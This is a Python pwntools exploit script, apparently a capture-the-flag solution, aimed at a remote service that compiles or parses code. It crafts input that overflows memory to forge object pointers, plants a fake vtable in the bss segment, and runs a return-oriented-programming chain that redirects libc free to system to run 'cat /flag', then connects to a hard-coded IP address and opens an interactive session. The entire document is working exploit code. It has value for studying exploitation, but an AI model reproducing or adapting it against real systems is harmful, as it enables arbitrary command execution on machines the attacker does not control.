#!/usr/bin/env python3
from pwn import *
context.update(arch='amd64', os='linux')
p, u = pack, unpack

def overflow(data):
    overflows = []
    for i in range(len(data)):
        head = data[:i]
        tail = data[i:i+1]
        if tail == b'\0':
            overflows.insert(0, head.replace(b'\0', b'Z') + tail)
    code = b''
    for o in overflows:
        assert b'"' not in o
        code += b'annotation("""XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX' + o + b'\0");'
    return code

def write_type(data):
    return b'type("' + data + b'");'

def set_addr(addr):
    payload = b''

    # type str
    payload += p(addr - 1) # data
    payload += p(0xffffffffffffffff) # size
    payload += p(0xffffffffffffffff) # capacity
    payload += b'A' * 8

    # edges
    payload += b'A' * 8

    # condition str
    payload += b'A' * 32

    return overflow(payload)

code = b'''
void test() {
while (1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+10) {}
while (1) {
'''

bss_addr = 0x1d29010
code += set_addr(bss_addr)

# 0x000000000130cb5f : mov rbp, rdi ; call qword ptr [rax + 0x10] // 4889fdff5010
# 0x000000000046aa99 : leave ; mov rax, rcx ; pop rbx ; ret
mov_rdi_to_rbp_and_continue = 0x130cb5f
leave_pop_ret = 0x46aa99
bss_payload = b''
bss_payload += p(mov_rdi_to_rbp_and_continue) # pc
bss_payload += p(leave_pop_ret)
code += write_type(bss_payload)

command_addr = bss_addr + 0x100
code += set_addr(command_addr)
code += write_type(b'cat /flag\0')

zero_vector_ptr = 0x1d28f10

# Clean up to prevent clone from crashing.
payload = b''
payload += p(0) * 2 + b'A' * 16 # type str
payload += p(zero_vector_ptr) # edges
payload += p(0) * 2 + b'A' * 16 # condition str

payload += b'A' * 8
payload += p(0xa1)

payload += b'A' * 0x98
payload += p(0xa1)

payload += p(bss_addr - 8) # vtable for cloned while
payload += b'A' * 8

libc_free =   0xa5460
libc_system = 0x50d60

free_got = 0x1D212C0

# 0x000000000047e11c : mov rax, qword ptr [rdi] ; ret // 488b07c3
load_rax_rdi_ret = 0x47e11c

# 0x000000000043031b : pop rdi ; ret // 5fc3
pop_rdi_ret = 0x43031b
ret = 0x43031c

pop_rcx_ret = 0x7eb231

# 0x00000000004d64be : add rax, rcx ; ret // 4801c8c3
add_rax_rcx_ret = 0x4d64be

# 0x000000000042d014 : call rax // ffd0
call_rax = 0x42d014

payload += p(pop_rdi_ret)
payload += p(free_got)
payload += p(load_rax_rdi_ret)
payload += p(pop_rcx_ret)
payload += p((libc_system - libc_free) & 0xffffffffffffffff)
payload += p(add_rax_rcx_ret)
payload += p(pop_rdi_ret)
payload += p(command_addr)
payload += p(ret)
payload += p(call_rax)
payload += b'A' * 8
code += overflow(payload)

code += b'''
}
}
'''

assert b'#' not in code

r = remote('54.180.128.137', 1234)
r.recvuntil(b' > ')
print('sending code')
r.sendline(base64.b64encode(code))
r.interactive(prompt='')
